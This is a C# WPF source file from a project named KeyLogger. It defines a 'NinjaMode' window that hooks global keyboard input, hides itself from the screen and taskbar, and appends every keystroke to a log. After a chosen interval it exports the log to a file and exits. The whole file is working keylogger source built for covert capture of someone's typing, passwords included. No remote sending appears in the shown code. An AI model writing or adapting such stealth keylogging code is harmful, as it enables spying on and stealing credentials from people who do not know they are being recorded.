using KeyLogger.FileUtil;
using KeyLogger.KeyboardUtil;
using System;
using System.Windows;

namespace KeyLogger
{
    /// <summary>
    /// Interaction logic for NinjaMode.xaml
    /// </summary>
    public partial class NinjaMode : Window
    {
        System.Windows.Threading.DispatcherTimer log_timer;
        public NinjaMode()
        {
            InitializeComponent();
            time_box.Items.Add("Milliseconds");
            time_box.Items.Add("Seconds");
            time_box.Items.Add("Minutes");
            time_box.Items.Add("Hours");
            time_box.SelectedIndex = 0;
        }
        KeyboardListener listener;
        private void start_button_Click(object sender, RoutedEventArgs e)
        {
            listener = new KeyboardListener();
            log_timer = new System.Windows.Threading.DispatcherTimer();
            listener.KeyDown += new RawKeyEventHandler(KeyboardRecorder);
            log_timer.Tick += log_timer_Tick;
            this.ShowInTaskbar = false;
            this.Opacity = 0;
            this.Visibility = Visibility.Hidden;
            try
            {
                int time = Int32.Parse(duration_box.Text);
                if (time_box.SelectedIndex == 0)
                {
                    log_timer.Interval = TimeSpan.FromMilliseconds(time);
                }
                else if (time_box.SelectedIndex == 1)
                {
                    log_timer.Interval = TimeSpan.FromMilliseconds(time * 1000);
                }
                else if (time_box.SelectedIndex == 2)
                {
                    log_timer.Interval = TimeSpan.FromMilliseconds(time * 60000);
                }
                else if (time_box.SelectedIndex == 3)
                {
                    log_timer.Interval = TimeSpan.FromMilliseconds(time * 3600000);
                }
                else
                {
                    MessageBox.Show("Invalid input.", "Status", MessageBoxButton.OK);
                }
                log_timer.Start();
            }
            catch (Exception error)
            {
                Console.WriteLine("Error here " + error.StackTrace);
                MessageBox.Show("Invalid input.", "Status", MessageBoxButton.OK);
            }
        }
        private void KeyboardRecorder(object sender, RawKeyEventArgs args)
        {
            log_box.Text += args.ToString();
        }
        private void log_timer_Tick(object sender, EventArgs e)
        {
            ExportData export = new ExportData();
            export.WriteText("log", log_box);
            listener.Dispose();
            Application.Current.Shutdown();
        }
    }
}
